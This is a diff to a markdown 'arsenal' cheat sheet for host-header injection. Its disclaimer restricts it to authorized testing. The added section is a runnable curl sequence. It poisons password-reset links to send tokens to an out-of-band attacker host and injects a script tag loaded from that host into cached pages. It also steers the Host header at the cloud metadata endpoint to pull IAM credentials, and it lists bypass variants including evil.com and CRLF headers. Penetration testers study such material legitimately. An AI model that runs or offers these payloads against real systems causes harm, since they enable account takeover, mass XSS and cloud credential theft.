@@ -1,7 +1,42 @@
 # Host-Header Arsenal — Spoofing Headers, Validation Bypasses & Sink Payloads (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `HOST_HEADER_INJECTION_TESTING_GUIDE.md`. Authorized testing only — own accounts, benign markers,
 > non-shared cache keys (Guide §19). The finding is the **sink impact** (ATO / mass XSS / SSRF), not a reflected header.
+
+---
+
+## 0. The whole attack in one sequence (copy-paste — baseline → classify the sink → cash out)
+
+*What & when:* the Host-header method as one runnable sequence — the arsenal twin of guide **§13.2**. The kit's spine is **"one header, classify the sink":** baseline what the effective host *does*, then route to the matching cash-out. Own accounts, benign markers; the moment impact is proven, stop.
+
+```bash
+T=https://bank.target.com ; OOB=uniq.oob.pro
+
+# --- Step 0: BASELINE — send the host 3 ways, watch what changes (guide §4) ---
+curl -s -o /dev/null -w '%{http_code}\n' "$T/" -H "Host: bank.target.com"     # normal
+curl -s "$T/" -H "Host: evil.attacker.com" | head -c 200                       # reflected in a link? 400 invalid? same app?
+curl -s "$T/" -H "Host: localhost" | head -c 200                               # DIFFERENT internal content? = routing sink
+
+# --- Step 1: CLASSIFY → route to the cash-out (guide §8) ---
+
+# (A) REFLECTED host -> password-reset poisoning -> ATO (guide §11) — trigger reset FOR your victim acct B:
+curl -s "$T/api/password/forgot" -H "X-Forwarded-Host: $OOB" \
+     -H 'Content-Type: application/json' -d '{"email":"victim-B@example.com"}'   # B's token lands at $OOB when clicked
+
+# (B) REFLECTED + CACHED host -> web-cache poisoning -> mass XSS/redirect (guide §12) — with a cache-buster:
+curl -s "$T/?cb=$RANDOM" -H "X-Forwarded-Host: $OOB\"><script src=//$OOB/x.js></script>"  # then re-request: is it cached?
+
+# (C) ROUTING sink -> SSRF -> cloud metadata (guide §13.2) — confirm reach, then steer at IMDS:
+curl -s "$T/" -H "Host: $OOB"                                                  # front-end hits $OOB from ITS IP = routing-SSRF
+curl -s "$T/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"   # -> role name -> then creds
+#   validate creds READ-ONLY:  aws sts get-caller-identity   (then STOP — describe, don't use further)
+
+# (D) OAuth callback built from host -> code/token theft -> ATO (guide §14): set Host/X-Forwarded-Host to $OOB in the flow.
+```
+
+**Validation-bypass menu (when plain `Host` is checked — guide §7):** `X-Forwarded-Host` · `X-Host` · `X-Forwarded-Server` · dual `Host:` (two headers) · `Host: real.com:@evil.com` (userinfo) · absolute-form request line `GET https://evil.com/ HTTP/1.1` · `Host: real.com\n Host: evil.com` (CRLF) · `evil.com` as a subdomain-looking suffix (`real.com.evil.com`).
 
 ---
 
